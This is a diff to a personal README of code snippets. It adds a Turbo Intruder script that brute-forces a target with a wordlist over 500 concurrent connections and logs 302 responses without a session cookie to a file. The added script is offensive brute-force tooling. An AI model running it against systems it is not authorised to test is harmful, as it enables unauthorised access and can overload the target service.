@@ -4,6 +4,27 @@ A github repo maintaining mostly (python) code snippets which I use approximatel
 
 ---
 
+#### Bruteforce wordlist using Turbo Intruder and write results in file
+```python3
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=500,
+                           requestsPerConnection=5000,
+                           pipeline=False
+                           )
+
+    for word in open('/home/umar_0x01/url/wordlist4.txt'):
+        engine.queue(target.req, word.rstrip())
+
+
+def handleResponse(req, interesting):
+    with open('/tmp/test.txt', 'a+') as f:
+        if 'set-cookie: session=' not in req.response:
+            if '302' in req.response:
+                table.add(req)
+                f.write(req.response)
+```
+
 #### Creating S3 presigned url with 1 hour expiration time
 
 ```python3
